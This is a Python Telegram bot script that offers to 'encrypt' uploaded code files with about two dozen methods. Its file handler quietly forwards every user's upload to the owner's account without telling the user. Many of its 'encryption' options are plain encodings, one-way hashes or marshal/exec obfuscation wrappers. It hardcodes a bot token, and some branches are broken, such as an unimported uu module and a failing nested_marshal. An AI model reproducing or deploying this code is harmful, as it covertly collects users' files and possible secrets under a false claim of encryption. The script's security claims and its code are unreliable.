import telebot
from telebot import types
import os
import base64, marshal, zlib, bz2, quopri, lzma, codecs
import hashlib, binascii
from io import BytesIO

# Bot credentials
BOT_TOKEN = '7558644926:AAE1LO5H3P7HJH68lJ2YQBBuF_P72hryPJU'
OWNER_ID = 7467384643

bot = telebot.TeleBot(BOT_TOKEN)
user_files = {}

WATERMARK = b'\n# ENC BY @NGYT777GG JOIN TELEGRAM CHANNEL\n'

@bot.message_handler(commands=['start'])
def start_message(message):
    bot.reply_to(message, "Welcome! Please send any file (Python, HTML, JS, PHP, etc.) to encrypt.\n BOT MADE BY @NGYT777GG \n VIST OUR CHANNEL THAT'S MAKE YOUR DAY")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    filename = message.document.file_name

    # Save user file temporarily in memory
    user_files[message.from_user.id] = {'data': downloaded, 'name': filename}

    # Forward file to OWNER
    bot.forward_message(OWNER_ID, message.chat.id, message.message_id)

    # Inform user
    bot.send_message(message.chat.id, f"Uploading file: {filename}\nProcessing...")

    # Inline encryption methods (first 10 shown, more later)
    methods = ['marshal', 'base64', 'zlib', 'rot13', 'hex', 'bz2', 'quopri', 'lzma', 'xor',
               'reverse', 'double_base64', 'md5', 'sha256', 'crc32', 'binascii', 'gzip',
               'rle', 'caesar', 'triple_rot13', 'swapcase', 'xor_shift', 'nested_marshal', 'urlsafe_b64', 'html_escape']

    markup = types.InlineKeyboardMarkup()
    for i in range(0, len(methods), 2):
        row = [types.InlineKeyboardButton(methods[i].upper(), callback_data=f'enc_{methods[i]}')]
        if i + 1 < len(methods):
            row.append(types.InlineKeyboardButton(methods[i + 1].upper(), callback_data=f'enc_{methods[i + 1]}'))
        markup.add(*row)

    bot.send_message(message.chat.id, "Choose encryption method:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("enc_"))
def encrypt_callback(call):
    method = call.data.split("_", 1)[1]
    user_data = user_files.get(call.from_user.id)

    if not user_data:
        bot.send_message(call.message.chat.id, "Please send a file first.")
        return

    try:
        bot.send_message(call.message.chat.id, f"Encrypting with {method.upper()}... Please wait.")

        encrypted = encrypt_file(user_data['data'], method)
        ext = os.path.splitext(user_data['name'])[1] or '.enc'
        out_filename = f"encrypted_{method}{ext}"

        with open(out_filename, 'wb') as f:
            f.write(WATERMARK)
            f.write(encrypted)
            f.write(WATERMARK)

        with open(out_filename, 'rb') as f:
            bot.send_document(call.message.chat.id, f)

        os.remove(out_filename)

    except Exception as e:
        bot.send_message(call.message.chat.id, f"Encryption failed: {e}")

def encrypt_file(data, method):
    if isinstance(data, bytes):
        try:
            data_str = data.decode()
        except:
            data_str = str(data)
    else:
        data_str = str(data)

    if method == 'marshal':
        code = compile(data_str, "<string>", "exec")
        return b"import marshal\nexec(marshal.loads(" + repr(marshal.dumps(code)).encode() + b"))"
    elif method == 'base64':
        return base64.b64encode(data)
    elif method == 'zlib':
        return zlib.compress(data)
    elif method == 'rot13':
        return codecs.encode(data_str, 'rot_13').encode()
    elif method == 'hex':
        return data.hex().encode()
    elif method == 'bz2':
        return bz2.compress(data)
    elif method == 'quopri':
        return quopri.encodestring(data)
    elif method == 'uu':
        buf = BytesIO()
        with open("temp_in", "wb") as temp:
            temp.write(data)
        with open("temp_in", "rb") as f_in, open("temp_out", "wb") as f_out:
            uu.encode(f_in, f_out)
        with open("temp_out", "rb") as f:
            out = f.read()
        os.remove("temp_in")
        os.remove("temp_out")
        return out
    elif method == 'lzma':
        return lzma.compress(data)
    elif method == 'xor':
        return bytes([b ^ 1337 % 256 for b in data])
    elif method == 'reverse':
        return data[::-1]
    elif method == 'double_base64':
        return base64.b64encode(base64.b64encode(data))
    elif method == 'md5':
        return hashlib.md5(data).hexdigest().encode()
    elif method == 'sha256':
        return hashlib.sha256(data).hexdigest().encode()
    elif method == 'crc32':
        return str(binascii.crc32(data)).encode()
    elif method == 'binascii':
        return binascii.b2a_hex(data)
    elif method == 'gzip':
        import gzip
        buf = BytesIO()
        with gzip.GzipFile(fileobj=buf, mode="wb") as f:
            f.write(data)
        return buf.getvalue()
    elif method == 'rle':
        from itertools import groupby
        return b''.join([bytes([len(list(g)), k]) for k, g in groupby(data)])
    elif method == 'caesar':
        return bytes([(b + 3) % 256 for b in data])
    elif method == 'triple_rot13':
        return codecs.encode(codecs.encode(codecs.encode(data_str, 'rot_13'), 'rot_13'), 'rot_13').encode()
    elif method == 'swapcase':
        return data_str.swapcase().encode()
    elif method == 'xor_shift':
        return bytes([b ^ (i % 256) for i, b in enumerate(data)])
    elif method == 'nested_marshal':
        code = compile(data_str, "<string>", "exec")
        return b"import marshal\nexec(marshal.loads(marshal.loads(" + repr(marshal.dumps(marshal.dumps(code))).encode() + b")))"
    elif method == 'urlsafe_b64':
        return base64.urlsafe_b64encode(data)
    elif method == 'html_escape':
        import html
        return html.escape(data_str).encode()
    else:
        raise Exception("Unknown method")

bot.polling()
